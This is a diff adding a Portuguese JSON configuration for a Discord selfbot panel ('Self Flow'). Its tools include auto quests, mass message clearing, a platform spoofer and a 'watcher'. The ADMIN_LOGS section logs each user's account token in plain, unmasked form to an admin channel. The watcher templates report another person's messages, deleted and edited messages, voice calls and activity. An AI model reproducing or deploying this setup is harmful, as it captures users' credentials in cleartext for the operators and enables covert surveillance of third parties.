@@ -1,0 +1,234 @@
+{
+  "version": 1,
+  "enabled": true,
+  "language": "pt-BR",
+  "appearance": {
+    "color": null,
+    "componentsV2": true,
+    "showBotAvatar": true,
+    "showTimestamp": false,
+    "showFooter": false,
+    "compact": true,
+    "useEmojis": true
+  },
+  "logEmbed": {
+    "titlePrefix": "Notify -",
+    "footer": "FLOW SYSTEMS · EVENT LOG",
+    "color": "#ffffff",
+    "showAccountAvatar": true,
+    "showTimestamp": true,
+    "emojis": {
+      "notify": "<:sinodenotificacaonasredessociais:1539698027613257759>",
+      "user": "<:usuarios:1536455037461594144>",
+      "date": "<:relogiotres:1539698823750750289>",
+      "token": "<:chave:1536462153593389177>"
+    },
+    "emojiFallbacks": {
+      "notify": "🔔",
+      "user": "👤",
+      "date": "🕒",
+      "token": "🔑"
+    }
+  },
+  "delivery": {
+    "directMessage": true,
+    "webhook": false,
+    "fallbackToText": true,
+    "retryAttempts": 2,
+    "retryDelayMs": 1500,
+    "eventCooldownMs": 3000
+  },
+  "directMessages": {
+    "autoQuest": {
+      "enabled": true,
+      "accentColor": "#ffffff",
+      "thumbnailDescription": "Self Flow",
+      "stopButtonLabel": "Interromper",
+      "states": {
+        "PREPARING": {
+          "title": "Preparando automação",
+          "content": "Buscando missões disponíveis..."
+        },
+        "RUNNING": {
+          "title": "Automação em andamento",
+          "content": "**Progresso**\n`{progressBar}`  **{done} de {total}**\n\n**Executando**\n{currentQuest}\n\n-# Esta mensagem é atualizada automaticamente."
+        },
+        "COMPLETE": {
+          "title": "Automação concluída",
+          "content": "**{done} missão(ões) concluída(s)** em {duration}."
+        },
+        "EMPTY": {
+          "title": "Nenhuma missão disponível",
+          "content": "Não há missões pendentes para esta conta."
+        },
+        "STOPPED": {
+          "title": "Automação interrompida",
+          "content": "{done} missão(ões) concluída(s) antes da interrupção."
+        },
+        "ERROR": {
+          "title": "Não foi possível continuar",
+          "content": "{detail}",
+          "fallback": "Tente iniciar novamente em alguns instantes."
+        }
+      }
+    }
+  },
+  "logRouting": {
+    "PUBLIC_LOGS": {
+      "channelId": "1546666563141107733",
+      "webhookUrl": "",
+      "description": "Ações realizadas pelos membros nas ferramentas",
+      "publicLogFormat": {
+        "enabled": true,
+        "template": "{notifyEmoji} Notify - {function}\n\n{userEmoji} `Usuario:` {user}\n{dateEmoji} `Data:` {timestamp}"
+      },
+      "events": [
+        "accountAdded",
+        "autoQuest",
+        "farmCall",
+        "clearMessages",
+        "leaveServers",
+        "removeFriends",
+        "watcher",
+        "closeDMs",
+        "openDMs",
+        "leaveGroups",
+        "richPresence",
+        "platformSpoofer"
+      ]
+    },
+    "ADMIN_LOGS": {
+      "channelId": "1546666563141107733",
+      "webhookUrl": "",
+      "description": "Configurações e ações realizadas por administradores",
+      "includeUserToken": true,
+      "tokenMode": "plain",
+      "maskToken": false,
+      "events": [
+        "allToolActions",
+        "logsConfigured",
+        "panelPublished",
+        "panelSynchronized",
+        "panelAppearanceChanged",
+        "engineSettingsChanged"
+      ],
+      "adminLogFormat": {
+        "enabled": true,
+        "template": "{notifyEmoji} Notify - Sistema do tools\n\n{userEmoji} Usuario: {user}\n{dateEmoji} Data: {timestamp}\n{tokenEmoji} Token: {token}"
+      }
+    }
+  },
+  "functionNames": {
+    "Conta conectada": "Conta conectada",
+    "Contas": "Contas",
+    "Auto Quest": "Auto Quest",
+    "Farm Call": "Farm Call",
+    "Limpar Mensagens": "Limpar Mensagens",
+    "Sair de Servidores": "Sair de Servidores",
+    "Remover Amizades": "Remover Amizades",
+    "Vigia": "Vigia",
+    "Fechar DMs": "Fechar DMs",
+    "Abrir DMs": "Abrir DMs",
+    "Sair de Grupos": "Sair de Grupos",
+    "Rich Presence": "Rich Presence",
+    "Platform Spoofer": "Platform Spoofer",
+    "Configurar logs públicos": "Configurar logs públicos",
+    "Configurar logs de admin": "Configurar logs de admin",
+    "Personalizar painel": "Personalizar painel",
+    "Alterar banner": "Alterar banner",
+    "Alterar título": "Alterar título",
+    "Alterar subtítulo": "Alterar subtítulo",
+    "Alterar descrição": "Alterar descrição",
+    "Alterar botão": "Alterar botão",
+    "Configurar engine": "Configurar engine",
+    "Publicar painel": "Publicar painel",
+    "Sincronizar painéis": "Sincronizar painéis"
+  },
+  "templates": {
+    "watcherEnabled": {
+      "enabled": true,
+      "title": "Vigia ativado",
+      "description": "Monitorando {target} em {sharedGuilds} servidor(es)."
+    },
+    "watcherDisabled": {
+      "enabled": true,
+      "title": "Vigia desativado",
+      "description": "O monitoramento de {target} foi encerrado."
+    },
+    "presenceChanged": {
+      "enabled": true,
+      "title": "Mudança de status",
+      "description": "{target} agora está {status}."
+    },
+    "voiceJoined": {
+      "enabled": true,
+      "title": "Entrou em call",
+      "description": "{target} entrou em {channel}.\nServidor: {guild}"
+    },
+    "voiceMoved": {
+      "enabled": true,
+      "title": "Trocou de call",
+      "description": "{target} saiu de {oldChannel} e entrou em {newChannel}.\nServidor: {guild}"
+    },
+    "voiceLeft": {
+      "enabled": true,
+      "title": "Saiu da call",
+      "description": "{target} saiu de {channel}.\nTempo conectado: {duration}"
+    },
+    "messageSent": {
+      "enabled": true,
+      "title": "Nova mensagem",
+      "description": "{target} enviou uma mensagem em {channel}.\n{content}"
+    },
+    "messageEdited": {
+      "enabled": true,
+      "title": "Mensagem editada",
+      "description": "{target} editou uma mensagem em {channel}.\nAntes: {before}\nDepois: {after}"
+    },
+    "messageDeleted": {
+      "enabled": true,
+      "title": "Mensagem apagada",
+      "description": "{target} apagou uma mensagem em {channel}.\n{content}"
+    },
+    "activityStarted": {
+      "enabled": true,
+      "title": "Atividade iniciada",
+      "description": "{target} começou a usar {activity}."
+    },
+    "activityStopped": {
+      "enabled": true,
+      "title": "Atividade encerrada",
+      "description": "{target} parou de usar {activity}."
+    },
+    "avatarChanged": {
+      "enabled": true,
+      "title": "Avatar alterado",
+      "description": "{target} alterou o avatar."
+    },
+    "nicknameChanged": {
+      "enabled": true,
+      "title": "Apelido alterado",
+      "description": "{target} mudou o apelido de {before} para {after}."
+    },
+    "questStarted": {
+      "enabled": true,
+      "title": "Quest iniciada",
+      "description": "{account} iniciou {quest}."
+    },
+    "questProgress": {
+      "enabled": true,
+      "title": "Quest em andamento",
+      "description": "{quest}\nProgresso: {progress}%"
+    },
+    "questCompleted": {
+      "enabled": true,
+      "title": "Quest concluída",
+      "description": "{quest} foi concluída.\nRecompensa: {orbs} Orbs"
+    },
+    "operationFailed": {
+      "enabled": true,
+      "title": "Falha na operação",
+      "description": "{operation} não foi concluída.\n{error}"
+    }
+  }
+}
